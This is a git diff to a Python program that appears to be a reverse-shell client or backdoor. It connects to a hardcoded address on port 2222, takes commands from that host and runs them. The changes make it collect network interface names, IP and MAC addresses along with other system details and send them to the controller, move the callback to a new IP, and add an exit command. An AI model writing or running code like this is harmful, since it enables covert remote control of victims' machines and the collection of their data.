@@ -4,10 +4,23 @@ import shutil
 import platform
 import psutil
 import stat
+import sys
+import netifaces
 # from colorama import Fore, Style
 
-def get_network_interfaces():
-    pass
+def get_network_infos():
+    ifaces = netifaces.interfaces()
+    IPv4 = netifaces.AF_INET
+    IPv6 = netifaces.AF_LINK
+    for no,inet in enumerate(ifaces):
+        addr = netifaces.ifaddresses(inet)
+        if IPv4 in addr and IPv6 in addr:
+            return f"""
+            Interface {no+1}
+            Interface name : {inet}
+            IP address : {addr[2][0]['addr']}
+            MAC address : {addr[17][0]['addr']}
+            """
 
 def get_system_information():
     if platform.system() == 'Windows':
@@ -36,7 +49,7 @@ def get_system_information():
     RAM : {}
     CPU usage : {}\n\n
     {}
-    Network interfaces : {}
+    {}\n
     """.format(
         'SYSTEM INFORMATION'.center(150),
         os_name,
@@ -53,6 +66,7 @@ def get_system_information():
         curr_ram,
         psutil.cpu_percent(),
         'NETWORK INFORMATION'.center(150),
+        get_network_infos()
     ).encode()
 
 def create_thing(get_cmd,sock):
@@ -79,7 +93,7 @@ def create_thing(get_cmd,sock):
 
 def main_root():
     sock = st.socket(st.AF_INET, st.SOCK_STREAM)
-    sock.connect(('192.168.81.14',2222))
+    sock.connect(('192.168.81.112',2222))
 
     while True:
         get_cmd = sock.recv(1024).decode().strip()
@@ -92,6 +106,10 @@ def main_root():
                 _dir = get_cmd.split(maxsplit=1)[1]  
                 os.chdir(_dir)  
                 sock.send(b"Directory changed successfully\n")
+
+            elif get_cmd in ('exit','quite'):
+                sock.close()
+                sys.exit()
 
             elif get_cmd.startswith('touch '):
                 create_thing(get_cmd,sock)
